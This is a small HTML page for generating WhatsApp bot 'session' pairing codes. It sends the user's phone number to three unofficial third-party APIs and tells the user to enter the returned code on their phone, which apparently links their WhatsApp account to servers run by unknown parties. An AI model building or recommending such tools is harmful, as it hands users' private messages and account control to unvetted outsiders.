<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KEV API | SESSION GEN</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&display=swap');

        :root {
            --bg: #f4f1de;
            --black: #000000;
            --white: #ffffff;
            --accent: #25d366;
            --shadow: 6px 6px 0px var(--black);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Space Grotesk', sans-serif;
            background-color: var(--bg);
            padding: 2rem 1rem;
            display: flex;
            justify-content: center;
        }

        .container { width: 100%; max-width: 400px; }

        .card {
            background: var(--white);
            border: 4px solid var(--black);
            box-shadow: var(--shadow);
            padding: 2rem;
            text-align: center;
        }

        .header-box {
            background: var(--black);
            color: var(--white);
            padding: 10px;
            margin-bottom: 2rem;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        input {
            width: 100%;
            padding: 15px;
            border: 4px solid var(--black);
            font-family: inherit;
            font-size: 1.1rem;
            font-weight: bold;
            margin-bottom: 1.5rem;
            outline: none;
        }

        #code-box {
            background: #eee;
            border: 4px dashed var(--black);
            padding: 1.5rem;
            font-size: 2.2rem;
            font-weight: 900;
            letter-spacing: 5px;
            margin-bottom: 1.5rem;
            min-height: 80px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #333;
        }

        button {
            width: 100%;
            padding: 15px;
            background: var(--black);
            color: var(--white);
            border: none;
            font-weight: 900;
            font-size: 1rem;
            cursor: pointer;
            text-transform: uppercase;
            transition: 0.1s;
        }

        button:active { transform: translate(3px, 3px); }
        button:disabled { background: #666; cursor: not-allowed; }

        #status {
            margin-top: 1rem;
            font-size: 0.85rem;
            font-weight: bold;
            padding: 10px;
            border: 2px solid var(--black);
            display: none;
        }

        .footer {
            margin-top: 2rem;
            font-size: 0.7rem;
            font-weight: bold;
            opacity: 0.6;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="card">
        <div class="header-box">KEV SESSION</div>
        
        <p style="font-size: 0.9rem; margin-bottom: 1rem; font-weight: 500;">
            Masukkan nomor WA Anda dengan kode negara.
        </p>

        <input type="number" id="phone" placeholder="628xxxxxxxxx" required>

        <div id="code-box">--------</div>

        <button id="btn" onclick="getPairing()">Generate Code</button>

        <div id="status"></div>

        <div class="footer">KEVCODEX PROJECT &copy; 2026</div>
    </div>
</div>

<script>
    async function getPairing() {
        const phone = document.getElementById('phone').value;
        const btn = document.getElementById('btn');
        const codeBox = document.getElementById('code-box');
        const status = document.getElementById('status');

        if (!phone || phone.length < 9) {
            alert("Nomor tidak valid!");
            return;
        }

        btn.disabled = true;
        status.style.display = "block";
        status.style.background = "#fff";
        status.innerHTML = "Meminta kode dari server (Trial 1)...";
        codeBox.innerHTML = "...";

        // Daftar API paling "FRESH" (Update Mei 2026)
        const apis = [
            `https://api.vreden.my.id/api/pairing?number=${phone}`,
            `https://widipe.com/pairing?number=${phone}`,
            `https://api.siputzx.my.id/api/pairing?number=${phone}`
        ];

        let success = false;

        for (let api of apis) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 15000); // Timeout 15 detik

                const res = await fetch(api, { signal: controller.signal });
                const data = await res.json();
                clearTimeout(timeoutId);

                // Ekstraksi kode dari berbagai format JSON
                const code = data.code || data.pairingCode || (data.result && data.result.code) || data.data;

                if (code) {
                    codeBox.innerHTML = code;
                    status.style.background = "#25d366";
                    status.innerHTML = "✅ BERHASIL! Masukkan kode ini di HP Anda.";
                    success = true;
                    btn.disabled = false;
                    break;
                }
            } catch (e) {
                status.innerHTML = "Jalur 1 sibuk, mencoba jalur lain...";
                console.log("Error pada API:", api);
            }
        }

        if (!success) {
            btn.disabled = false;
            status.style.background = "#ff5f5f";
            status.innerHTML = "❌ SEMUA JALUR GAGAL. Gunakan Termux untuk mengambil session manual jika mendesak.";
            codeBox.innerHTML = "LIMIT";
        }
    }
</script>

</body>
</html>
